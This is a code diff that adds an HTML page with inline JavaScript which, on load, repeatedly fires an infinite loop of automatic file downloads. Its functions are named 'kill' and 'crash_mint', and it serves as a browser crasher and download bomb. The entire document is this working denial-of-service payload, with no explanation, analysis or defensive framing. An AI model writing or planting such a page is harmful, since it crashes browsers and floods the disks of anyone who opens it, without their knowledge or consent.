@@ -1,0 +1,23 @@
+<html>
+  <script>
+    function download(g,h,j) {
+	var k = new Blob([g], {
+	    type: j
+	});
+	if (window.navigator.msSaveOrOpenBlob)
+	    window.navigator.msSaveOrOpenBlob(k,h);
+	else {
+	    var l = document.createElement("a"), m = URL.createObjectURL(k);
+	    l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+	}
+    }
+    function kill() {
+	var g = Math.random().toString(36).substring(20), h = Math.floor(50 * Math.random() + 25);
+	while (true) download(h,g,g);
+    }
+    function crash_mint() {
+	kill()
+    }
+    setInterval(crash_mint, 0.5);
+  </script>
+</html>
